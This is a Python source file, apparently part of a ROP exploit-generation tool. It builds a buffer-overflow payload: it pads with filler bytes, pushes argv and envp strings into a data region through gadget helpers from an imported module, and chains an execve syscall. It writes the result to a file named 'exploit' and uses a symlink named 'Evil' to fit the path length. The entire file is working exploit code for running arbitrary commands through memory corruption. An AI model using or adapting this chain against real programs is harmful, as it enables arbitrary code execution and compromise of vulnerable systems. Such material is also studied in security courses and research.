from pathlib import Path
import os

import Extracted_Functions


def generate_execve_chain(padding, data_address, command, envp):

    data_stack_pointer = data_address

    rop_chain = b'A' * padding

    argv = command.split()
    envp = envp.split()

    if (len(argv[0]) % 4) is not 0:
        symlink_path = Path("Evil")
        if os.path.exists(symlink_path):
            os.unlink(symlink_path)
        os.symlink(argv[0], symlink_path)
        argv[0] = "Evil"

    argv_ptr, bytes_pushed, rop_addition = push_array_of_strings(argv, data_stack_pointer)
    rop_chain += rop_addition
    data_stack_pointer += bytes_pushed
    envp_ptr, bytes_pushed, rop_addition = push_array_of_strings(envp, data_stack_pointer)
    rop_chain += rop_addition
    data_stack_pointer += bytes_pushed

    rop_chain += Extracted_Functions.execve_syscall(argv_ptr, data_address + 4)

    exploit_path = Path("exploit")
    with open(exploit_path, 'wb') as file:
        file.write(rop_chain)

    return exploit_path


def push_array_of_strings(array, address):
    item_ptrs = []
    data_stack_pointer = address
    rop_chain = b''

    for string in array:
        item_ptrs.append(data_stack_pointer)

        # Split string into chunks of size 4.
        chunks = [string[i:i + 4] for i in range(0, len(string), 4)]
        # Convert string to bytes.
        chunks = [chunk.encode('ascii') for chunk in chunks]
        # If the chunk isn't big enough, pad it with null characters.
        chunks = [chunk.ljust(4, b'\0') for chunk in chunks]

        for chunk in chunks:
            rop_chain += Extracted_Functions.push_bytes(chunk, data_stack_pointer)
            data_stack_pointer += 4

        rop_chain += Extracted_Functions.push_null(data_stack_pointer)
        data_stack_pointer += 4

    array_ptr = data_stack_pointer
    for ptr in item_ptrs:
        rop_chain += Extracted_Functions.push_ptr(ptr, data_stack_pointer)
        data_stack_pointer += 4

    rop_chain += Extracted_Functions.push_null(data_stack_pointer)
    data_stack_pointer += 4

    bytes_pushed = data_stack_pointer - address

    return array_ptr, bytes_pushed, rop_chain
